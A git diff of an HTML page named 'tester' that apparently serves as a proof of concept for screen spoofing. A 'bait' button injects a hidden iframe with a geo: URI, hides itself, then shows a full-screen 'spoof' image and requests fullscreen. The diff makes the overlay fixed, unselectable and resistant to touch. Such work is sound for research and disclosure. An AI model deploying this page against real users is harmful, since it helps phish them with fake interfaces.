@@ -4,36 +4,54 @@
     <meta charset="utf-8" />
     <meta
       name="viewport"
-      content="width=device-width, initial-scale=1.0, user-scalable=no"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
     <title>tester</title>
     <style>
+      html,
       body {
         margin: 0;
         padding: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        overscroll-behavior: none;
+        touch-action: none;
         background: #fff;
         text-align: center;
         font-family: sans-serif;
-        overflow: hidden;
       }
       #spoof {
         display: none;
-        width: 100vw;
-        height: 100vh;
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
         object-fit: cover;
+        transform: translateZ(0);
+        backface-visibility: hidden;
+        user-select: none;
+        -webkit-user-select: none;
+        pointer-events: none;
       }
       #bait {
-        margin-top: 30vh;
+        position: fixed;
+        inset: 0;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
       }
       button {
         padding: 15px 30px;
         font-size: 18px;
         cursor: pointer;
+        touch-action: manipulation;
       }
     </style>
   </head>
   <body>
-    <img id="spoof" src="spoof.png" alt="spoof" />
+    <img id="spoof" src="spoof.png" alt="spoof" decoding="sync" />
 
     <div id="bait">
       <h2>click button below</h2>
@@ -41,14 +59,18 @@
     </div>
 
     <script>
-      document.getElementById("btn").addEventListener("click", () => {
+      const btn = document.getElementById("btn");
+      const bait = document.getElementById("bait");
+      const spoof = document.getElementById("spoof");
+
+      btn.addEventListener("click", () => {
         const geoFrame = document.createElement("iframe");
         geoFrame.style.display = "none";
         geoFrame.src = "geo:0,0?q=apple.com";
         document.body.appendChild(geoFrame);
 
-        document.getElementById("bait").style.display = "none";
-        document.getElementById("spoof").style.display = "block";
+        bait.style.display = "none";
+        spoof.style.display = "block";
 
         document.documentElement.requestFullscreen().catch(() => {});
       });
